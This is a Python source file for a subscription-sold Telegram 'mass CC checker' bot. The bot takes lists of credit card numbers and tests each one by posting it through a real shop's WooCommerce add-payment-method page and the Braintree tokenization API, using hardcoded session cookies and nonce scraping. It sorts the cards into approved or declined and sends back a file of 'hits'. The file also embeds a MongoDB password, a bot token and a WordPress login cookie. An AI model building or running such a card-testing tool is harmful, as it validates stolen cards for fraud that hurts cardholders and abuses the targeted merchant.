import asyncio
import logging
import random
import string
import time
import uuid
from datetime import datetime, timedelta
import base64
import re
import aiohttp
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
import pymongo
from pymongo import MongoClient

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# MongoDB setup
try:
    client = MongoClient("mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0", serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client["fn_checker"]
    users_collection = db["users"]
    keys_collection = db["keys"]
    progress_collection = db["progress"]
except Exception as e:
    logger.error(f"MongoDB connection failed: {e}")
    raise

# Bot configuration
BOT_TOKEN = "7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs"  # Replace with your Telegram bot token
OWNER_ID = 7593550190  # Replace with your Telegram user ID
PROXY = False  # Set to True to enable proxy
PROXY_URL = "http://user:pass@proxy:port"  # Replace with your proxy URL
CHECKING_LIMITS = {"Gold": 500, "Platinum": 1000, "Owner": 3000}

# Session cookies from woolroots.com
SESSION_COOKIES = {
    "sbjs_migrations": "1418474375998%3D1",
    "sbjs_current_add": "fd%3D2025-05-22%2009%3A08%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29",
    "sbjs_first_add": "fd%3D2025-05-22%2009%3A08%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29",
    "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
    "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
    "sbjs_udata": "vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36",
    "PHPSESSID": "epp4evk0tmgbcr7um2cpljkq0k",
    "_lscache_vary": "3bd3b5fb94aa2fbc2bfac3d9be19d32b",
    "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221": "electraop%7C1748079547%7CnvUvwdvXEOeR41XAFGUhpk0s0lpOU7tDY7Nl9HRQGeX%7C2b28ebf14986a3d9b4504c044b2b15468b170becf4e7ec8e5df1f5417672cd7d",
    "sbjs_session": "pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F"
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload Files", callback_data="upload"), InlineKeyboardButton("Cancel Check", callback_data="cancel")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"""🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!

🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂
📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰:""",
        reply_markup=reply_markup,
    )
    logger.info("200 OK: Start command executed")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "upload":
        await query.message.reply_text("Send Your Txt File For Checking")
        logger.info("200 OK: Upload button clicked")
    elif query.data == "cancel":
        user_id = query.from_user.id
        progress_collection.delete_one({"user_id": user_id})
        await query.message.reply_text("Checking Cancelled ❌")
        logger.info("200 OK: Cancel button clicked")
    elif query.data == "help":
        await query.message.reply_text(
            f"""𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮

/start - Start the bot
/chk <cc> - Check a single CC (format: number|mm|yy|cvv)
/redeem <key> - Redeem a subscription key
Send a .txt file to check multiple CCs"""
        )
        logger.info("200 OK: Help button clicked")

async def check_cc(cx: str, user_id: int, tier: str) -> dict:
    start_time = time.time()
    try:
        cc = cx.split("|")[0]
        mes = cx.split("|")[1]
        ano = cx.split("|")[2]
        cvv = cx.split("|")[3]
        if "20" in ano:
            ano = ano.split("20")[1]

        session = aiohttp.ClientSession() if not PROXY else aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False), connector_owner=False, proxy=PROXY_URL
        )
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
            }
            async with session.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers) as response:
                response_text = await response.text()
                if "g-recaptcha" in response_text or "I'm not a robot" in response_text:
                    logger.error("reCAPTCHA detected on payment page. Session cookies may be invalid")
                    return {"status": "Error", "card": cx, "error": "reCAPTCHA detected. Please update session cookies"}
                nonce_matches = re.findall(r'"client_token_nonce":"(.*?)"', response_text)
                if not nonce_matches:
                    logger.error(f"Could not find client token nonce. Response: {response_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find client token nonce"}
                no = nonce_matches[0]

            headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://www.woolroots.com",
                "Referer": "https://www.woolroots.com/my-account/add-payment-method/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
            }
            data = {"action": "wc_braintree_credit_card_get_client_token", "nonce": no}
            async with session.post("https://www.woolroots.com/wp-admin/admin-ajax.php", headers=headers, data=data) as response:
                response_text = await response.text()
                token_matches = re.findall(r'"data":"(.*?)"', response_text)
                if not token_matches:
                    logger.error(f"Could not find token data. Response: {response_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find token data"}
                token = token_matches[0]
                try:
                    decoded_text = base64.b64decode(token).decode("utf-8")
                except Exception as e:
                    logger.error(f"Token decode error: {e}")
                    return {"status": "Error", "card": cx, "error": f"Token decode error: {e}"}
                au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au_matches:
                    logger.error(f"Could not find authorization fingerprint. Decoded text: {decoded_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find authorization fingerprint"}
                au = au_matches[0]

            headers = {
                "authority": "payments.braintree-api.com",
                "accept": "*/*",
                "authorization": f"Bearer {au}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "referer": "https://assets.braintreegateway.com/",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            }
            json_data = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv}, "options": {"validate": False}}},
                "operationName": "TokenizeCreditCard",
            }
            async with session.post("https://payments.braintree-api.com/graphql", headers=headers, json=json_data) as response:
                try:
                    token = (await response.json())["data"]["tokenizeCreditCard"]["token"]
                except Exception as e:
                    logger.error(f"Braintree response error: {e}")
                    return {"status": "Error", "card": cx, "error": f"Braintree response error: {e}"}

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
            }
            async with session.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers) as ges:
                response_text = await ges.text()
                pay_matches = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response_text)
                if not pay_matches:
                    logger.error(f"Could not find payment nonce. Response: {response_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find payment nonce"}
                pay = pay_matches[0]

            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.woolroots.com",
                "Referer": "https://www.woolroots.com/my-account/add-payment-method/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
            }
            data = {
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": "master-card",
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": '{"correlation_id":"51ca2c79b2fb716c3dc5253052246e65"}',
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": pay,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            }
            await asyncio.sleep(25)
            async with session.post("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, data=data) as response:
                soup = BeautifulSoup(await response.text(), "html.parser")
                try:
                    msg = soup.find("i", class_="nm-font nm-font-close").parent.text.strip()
                except:
                    msg = "Status code avs: Gateway Rejected: avs"

            card_info = f"{cc[:6]}xxxxxx{cc[-4:]} | {mes}/{ano} | {cvv}"
            issuer = "Unknown"
            country = "Unknown"
            proxy_status = "Live" if PROXY else "None"

            result = {
                "message": msg,
                "issuer": issuer,
                "country": country,
                "time_taken": time.time() - start_time,
                "proxy_status": proxy_status,
            }

            if "Gateway Rejected: avs" in msg:
                status = "Declined ❌"
            elif "2010: Card Issuer Declined CVV" in msg:
                status = "CCN ✅"
            else:
                status = "Approved ✅"

            return {
                "status": status,
                "card": cx,
                "card_info": card_info,
                "result": result,
                "checked_by": f"<a href='tg://user?id={user_id}'>{user_id}</a>",
                "tier": tier,
            }
        except Exception as e:
            logger.error(f"Error checking CC {cx}: {e}")
            return {"status": "Error", "card": cx, "error": str(e)}
        finally:
            await session.close()
    except Exception as e:
        logger.error(f"Invalid CC format or parsing error: {e}")
        return {"status": "Error", "card": cx, "error": "Invalid CC format or parsing error"}

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user or "expiration" not in user or user["expiration"] < datetime.utcnow():
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        if user and "expiration" not in user:
            logger.error(f"User {user_id} has incomplete document: missing 'expiration' field")
        return

    tier = user["tier"]
    args = context.args
    if len(args) != 1 or not re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$", args[0]):
        await update.message.reply_text("Invalid format. Use: /chk 4242424242424242|02|27|042")
        logger.error("Invalid CC format provided")
        return

    checking_message = await update.message.reply_text("Checking Your Cc Please Wait..")
    result = await check_cc(args[0], user_id, tier)

    if result["status"] == "Error":
        await checking_message.delete()
        await update.message.reply_text(f"Error: {result['error']}")
        logger.error(f"Check CC failed: {result['error']}")
        return

    response = (
        f"{result['status']}\n\n"
        f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
        f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
        f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['result']['message']}\n\n"
        f"[ϟ]𝗜𝗻𝗳𝗼 -» {result['card_info']}\n"
        f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {result['result']['issuer']} 🏛\n"
        f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {result['result']['country']}\n\n"
        f"[⌬]𝗧𝗶𝗺𝗲 -» {result['result']['time_taken']:.2f} seconds\n"
        f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['result']['proxy_status']}\n"
        f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {result['checked_by']} {result['tier']}\n"
        f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>"
    )
    await checking_message.delete()
    await update.message.reply_text(response, parse_mode="HTML")
    logger.info("200 OK: CC check completed")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user or "expiration" not in user or user["expiration"] < datetime.utcnow():
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        if user and "expiration" not in user:
            logger.error(f"User {user_id} has incomplete document: missing 'expiration' field")
        return

    tier = user["tier"]
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = file_content.decode("utf-8").splitlines()
    cards = [card.strip() for card in cards if re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$", card.strip())]
    
    if not cards:
        await update.message.reply_text("No valid CCs found in the file.")
        logger.error("No valid CCs found in the file")
        return

    if len(cards) > CHECKING_LIMITS[tier]:
        await update.message.reply_text(f"Your tier ({tier}) allows checking up to {CHECKING_LIMITS[tier]} CCs.")
        cards = cards[:CHECKING_LIMITS[tier]]
        logger.info(f"200 OK: Limited to {CHECKING_LIMITS[tier]} CCs for tier {tier}")

    await update.message.reply_text(
        f"""✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...

⚡ 𝐒𝐩𝐞𝐞𝐝: 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐖𝐡𝐞𝐮𝐭 50 𝐜𝐚𝐫𝐝𝐬/𝐬𝐞𝐜"""
    )
    logger.info("200 OK: File received for checking")

    progress_collection.insert_one({
        "user_id": user_id,
        "total": len(cards),
        "approved": 0,
        "declined": 0,
        "ccn": 0,
        "checked": 0,
        "start_time": time.time(),
        "results": [],
    })

    async def update_progress():
        while True:
            progress = progress_collection.find_one({"user_id": user_id})
            if not progress or progress["checked"] >= progress["total"]:
                break
            approved = progress["approved"]
            declined = progress["declined"]
            ccn = progress["ccn"]
            checked = progress["checked"]
            total = progress["total"]
            progress_bar = (
                f"APPROVED :- {approved}\n"
                f"CCN :- {ccn}\n"
                f"DECLINED :- {declined}\n"
                f"TOTAL :- {total}"
            )
            try:
                await context.bot.edit_message_text(
                    chat_id=update.message.chat_id,
                    message_id=progress_message.message_id,
                    text=progress_bar,
                )
            except:
                pass
            await asyncio.sleep(5)

    progress_message = await update.message.reply_text(f"Starting progress...\nAPPROVED :- 0\nCCN :- 0\nDECLINED :- 0\nTOTAL :- {len(cards)}")
    asyncio.create_task(update_progress())

    results = []
    for i in range(0, len(cards), 3):
        batch = cards[i:i+3]
        tasks = [check_cc(card, user_id, tier) for card in batch]
        batch_results = await asyncio.gather(*tasks)
        results.extend(batch_results)

        progress = progress_collection.find_one({"user_id": user_id})
        for result in batch_results:
            if result["status"] == "Approved ✅":
                progress["approved"] += 1
            elif result["status"] == "CCN ✅":
                progress["ccn"] += 1
            else:
                progress["declined"] += 1
            progress["checked"] += 1
            progress["results"].append(result)
            progress_collection.update_one({"user_id": user_id}, {"$set": progress})

        if progress["checked"] % 50 == 0:
            await update.message.reply_text(f"Checked {progress['checked']} cards")
        await asyncio.sleep(70)

    progress = progress_collection.find_one({"user_id": user_id})
    total_time = time.time() - progress["start_time"]
    avg_speed = progress["checked"] / total_time if total_time > 0 else 0
    success_rate = (progress["approved"] + progress["ccn"]) / progress["total"] * 100 if progress["total"] > 0 else 0

    summary = (
        f"""[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {progress['approved']}
[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱: {progress['declined']}
[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {progress['checked']}/{progress['total']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {progress['total']}
[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝗼𝗻: {total_time:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥✘ </a>"""
    )
    await update.message.reply_text(summary, parse_mode="HTML")
    logger.info("200 OK: File checking completed")

    hits = [r for r in progress["results"] if r["status"] in ["Approved ✅", "CCN ✅"]]
    if hits:
        hits_file = f"fn-b3-hits-{random.randint(1000, 9999)}.txt"
        with open(hits_file, "w") as f:
            for hit in hits:
                f.write(f"{hit['card']} - {hit['status']} - {hit['result']['message']}\n")
        await update.message.reply_document(document=open(hits_file, "rb"), filename=hits_file)
        logger.info("200 OK: Hits file generated and sent")

    progress_collection.delete_one({"user_id": user_id})

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can generate keys.")
        logger.error("Unauthorized genkey attempt")
        return

    args = context.args
    if len(args) != 3 or args[0] not in CHECKING_LIMITS or not args[1].endswith("d") or not args[2].isdigit():
        await update.message.reply_text("Usage: /genkey <tier> <duration>d <quantity>\nExample: /genkey Gold 1d 5")
        logger.error("Invalid genkey format")
        return

    tier = args[0]
    duration = int(args[1][:-1])
    quantity = int(args[2])
    keys = []
    for _ in range(quantity):
        key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        keys_collection.insert_one({"key": key, "tier": tier, "duration_days": duration, "used": False})
        keys.append(key)

    response = (
        f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n\n" +
        '\n'.join([f"➔ {key}\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration} days" for key in keys]) +
        "\n\n𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n𝐓𝐲𝐩𝐞 /redeem {key}"
    )
    await update.message.reply_text(response)
    logger.info("200 OK: Keys generated")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        logger.error("Invalid redeem format")
        return

    key = args[0]
    key_data = keys_collection.find_one({"key": key, "used": False})
    if not key_data:
        await update.message.reply_text("Invalid or used key.")
        logger.error("Invalid or used key")
        return

    user_id = update.effective_user.id
    expiration = datetime.utcnow() + timedelta(days=key_data["duration_days"])
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"tier": key_data["tier"], "expiration": expiration}},
        upsert=True,
    )
    keys_collection.update_one({"key": key}, {"$set": {"used": True}})

    await update.message.reply_text(
        f"""𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧 🎉

𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅

𝐕𝐚𝐥𝐮𝐞: {key_data['tier']} {key_data['duration_days']} days

𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"""
    )
    logger.info("200 OK: Key redeemed")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can broadcast messages.")
        logger.error("Unauthorized broadcast attempt")
        return

    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("Please provide a message to broadcast.")
        logger.error("No broadcast message provided")
        return

    users = users_collection.find()
    for user in users:
        try:
            await context.bot.send_message(chat_id=user["user_id"], text=message, parse_mode="HTML")
        except:
            continue
    await update.message.reply_text("Broadcast sent successfully.")
    logger.info("200 OK: Broadcast sent")

def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("chk", chk))
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.run_polling()
    except Exception as e:
        logger.error(f"Bot startup failed: {e}")
        raise

if __name__ == "__main__":
    main()